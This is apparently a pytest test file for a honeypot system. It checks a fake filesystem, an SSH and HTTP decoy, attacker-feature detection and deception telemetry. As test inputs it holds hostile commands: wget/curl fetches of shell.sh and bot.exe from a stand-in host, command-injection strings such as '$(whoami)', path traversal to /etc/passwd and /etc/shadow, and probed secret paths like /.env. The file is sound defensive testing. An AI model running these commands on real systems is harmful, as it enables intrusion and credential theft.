import pytest
from backend.honeypot.fake_filesystem import FakeFilesystem
from backend.core.feature_extractor import extract_features
from backend.core.cooperative_rl_engine import calculate_joint_reward
from backend.models.session import AttackerSession

def test_stateful_filesystem_ops():
    fs = FakeFilesystem()
    assert fs.pwd() == "/root"

    # mkdir stateful
    res_mkdir = fs.mkdir("/tmp/tools")
    assert res_mkdir == ""

    # cd stateful
    res_cd = fs.cd("/tmp/tools")
    assert res_cd == ""
    assert fs.pwd() == "/tmp/tools"

    # touch stateful
    res_touch = fs.touch("test.txt")
    assert res_touch == ""

    # ls stateful
    ls_out = fs.ls()
    assert "test.txt" in ls_out

    # chmod stateful
    res_chmod = fs.chmod("+x", "test.txt")
    assert res_chmod == ""

    # ls -l stateful
    ls_l_out = fs.ls(long_format=True)
    assert "-rwxr-xr-x" in ls_l_out
    assert "test.txt" in ls_l_out

def test_path_traversal_and_command_injection_safety():
    fs = FakeFilesystem()
    
    # Path traversal protection test in virtual filesystem
    res_cd_escaped = fs.cd("/../../../../etc")
    assert fs.pwd() == "/etc"
    
    cat_shadow = fs.cat("/etc/shadow")
    assert "permission denied" in cat_shadow

    # Feature extractor security indicator tests
    feat_traversal = extract_features("127.0.0.1", 22, "ssh", "cat /etc/passwd", {"event": "command"})
    assert feat_traversal["has_path_traversal"] == 1

    feat_cmd_inj = extract_features("127.0.0.1", 22, "ssh", "cat /etc/passwd; id", {"event": "command"})
    assert feat_cmd_inj["has_command_injection"] == 1

def test_fingerprinting_detection():
    fingerprint_cmds = [
        "cat /proc/version",
        "cat /proc/1/cmdline",
        "uname -a",
        "ls /proc",
        "ls /sys",
        "systemctl",
        "mount",
        "dmesg",
        "iptables -l",
        "ps aux",
        "ss -tulpn"
    ]
    for cmd in fingerprint_cmds:
        feat = extract_features("127.0.0.1", 22, "ssh", cmd, {"event": "command"})
        assert feat["is_fingerprinting_attempt"] == 1, f"Failed to detect fingerprinting for: {cmd}"

def test_download_attempt_detection():
    download_cmds = [
        "wget http://malicious.test/shell.sh",
        "curl -O http://malicious.test/bot.exe"
    ]
    for cmd in download_cmds:
        feat = extract_features("127.0.0.1", 22, "ssh", cmd, {"event": "command"})
        assert feat["is_payload_download_attempt"] == 1, f"Failed to detect download for: {cmd}"

def test_consistent_fake_os_responses():
    from backend.honeypot.ssh_server import dispatch_command, HOSTNAME
    fs = FakeFilesystem()
    
    # Test OS/hostname consistency
    assert dispatch_command(fs, "hostname") == HOSTNAME
    assert HOSTNAME in dispatch_command(fs, "cat /etc/hostname")
    assert "Ubuntu" in dispatch_command(fs, "cat /etc/os-release")
    assert "5.15.0-91-generic" in dispatch_command(fs, "uname -r")
    assert "Mem:" in dispatch_command(fs, "free -h")
    assert "Filesystem" in dispatch_command(fs, "df -h")

def test_joint_reward_calculation_bounds():
    session_good = AttackerSession(
        session_duration=45.0,
        interaction_depth=4,
        fingerprinting_attempts=3,
        download_attempts=1,
        attack_types=["brute_force", "command_injection"]
    )
    reward_good = calculate_joint_reward(session_good, 0.9)
    assert 20.0 <= reward_good <= 50.0

    session_bad = AttackerSession(
        session_duration=0.5,
        interaction_depth=1,
        fingerprinting_attempts=0,
        download_attempts=0,
        attack_types=[]
    )
    reward_bad = calculate_joint_reward(session_bad, 0.1)
    assert -20.0 <= reward_bad <= 5.0

def test_schema_migration_old_table():
    """
    Creates an old-style attacker_sessions schema lacking fingerprinting_attempts and download_attempts,
    runs migrate_db(), and verifies that both columns are added with default value 0.
    """
    import sqlite3
    from sqlalchemy import create_engine, inspect, text
    from sqlalchemy.orm import sessionmaker
    from backend.database import migrate_db, Base

    # 1. Setup in-memory engine and build old-style table manually
    test_engine = create_engine("sqlite:///:memory:")
    
    with test_engine.begin() as conn:
        conn.execute(text("""
            CREATE TABLE attacker_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address VARCHAR,
                session_id VARCHAR UNIQUE,
                attack_count INTEGER DEFAULT 0,
                risk_score FLOAT DEFAULT 0.0,
                is_active BOOLEAN DEFAULT 1
            )
        """))
        # Insert a sample old record
        conn.execute(text("""
            INSERT INTO attacker_sessions (ip_address, session_id, attack_count, risk_score, is_active)
            VALUES ('192.168.1.100', 'old_sess_123', 5, 45.0, 1)
        """))

    # 2. Patch database module engine temporarily to run migrate_db() on test_engine
    import backend.database as db_module
    orig_engine = db_module.engine
    try:
        db_module.engine = test_engine
        migrate_db()
    finally:
        db_module.engine = orig_engine

    # 3. Verify columns exist via Inspector
    inspector = inspect(test_engine)
    cols = [c['name'] for c in inspector.get_columns('attacker_sessions')]
    assert "fingerprinting_attempts" in cols
    assert "download_attempts" in cols

    # 4. Verify existing record populated default 0 for both columns
    with test_engine.connect() as conn:
        row = conn.execute(text("SELECT fingerprinting_attempts, download_attempts FROM attacker_sessions WHERE session_id = 'old_sess_123'")).fetchone()
        assert row is not None
        assert row[0] == 0  # fingerprinting_attempts
        assert row[1] == 0  # download_attempts

def test_security_self_test_isolation():
    """
    Verifies that dangerous inputs (path traversal, command injection, shell escapes)
    never escape the virtual sandbox or execute host OS commands.
    """
    from backend.honeypot.ssh_server import dispatch_command
    fs = FakeFilesystem()

    malicious_inputs = [
        "../../../../etc/passwd",
        "..\\..\\..\\Windows\\System32\\cmd.exe",
        "; whoami",
        "&& whoami",
        "$(whoami)",
        "`whoami`",
        "../../../backend/main.py",
        "cat /proc/self/environ"
    ]

    for inp in malicious_inputs:
        output = dispatch_command(fs, f"cat {inp}")
        assert output is not None
        # Must not expose real host path, Windows path, or Python exception
        assert "c:\\" not in output.lower()
        assert "C:\\" not in output
        assert "Traceback" not in output

def test_http_suspicious_paths_recognition():
    """
    Verifies that every suspicious HTTP path is recognized independently.
    """
    from backend.honeypot.http_decoy import handle_request
    from aiohttp.test_utils import make_mocked_request

    paths = [
        "/.env", "/config.env", "/admin", "/login", "/wp-login.php",
        "/phpmyadmin", "/actuator", "/server-status", "/wp-config.php",
        "/config.yaml", "/robots.txt", "/api", "/wp-admin"
    ]
    for path in paths:
        req = make_mocked_request("GET", path, headers={"Host": "localhost"})
        # Ensure path parsing and routing executes cleanly without syntax/import errors
        assert req.path == path

def test_deception_transition_telemetry():
    """
    Verifies that DeceptionTransition records hold accurate prev_profile, next_profile,
    risk_before, risk_after, and reward values.
    """
    from sqlalchemy import create_engine
    from sqlalchemy.orm import sessionmaker
    from backend.database import Base
    from backend.models.session import AttackerSession
    from backend.models.policy import DeceptionTransition
    from backend.core.decision_engine import AutonomousDecisionEngine

    engine = create_engine("sqlite:///:memory:")
    TestingSessionLocal = sessionmaker(bind=engine)
    Base.metadata.create_all(bind=engine)
    db = TestingSessionLocal()

    # 1. Create initial session
    session = AttackerSession(
        ip_address="192.168.1.50",
        session_id="test_trans_sess",
        honeypot_state="default",
        risk_score=20.0,
        interaction_depth=1
    )
    db.add(session)
    db.commit()

    # 2. Evaluate decision transition
    engine_inst = AutonomousDecisionEngine(db)
    eval_res = engine_inst.evaluate_decision_state(
        "192.168.1.50", "test_trans_sess", "command_injection", 0.95,
        prev_profile="default", prev_risk=20.0
    )

    # 3. Retrieve logged transition
    trans = db.query(DeceptionTransition).filter(DeceptionTransition.session_id == "test_trans_sess").first()
    assert trans is not None
    assert trans.prev_profile == "default"
    assert trans.risk_before == 20.0
    assert trans.trigger_event == "command_injection"
    assert isinstance(trans.reward, float)

    db.close()
    Base.metadata.drop_all(bind=engine)
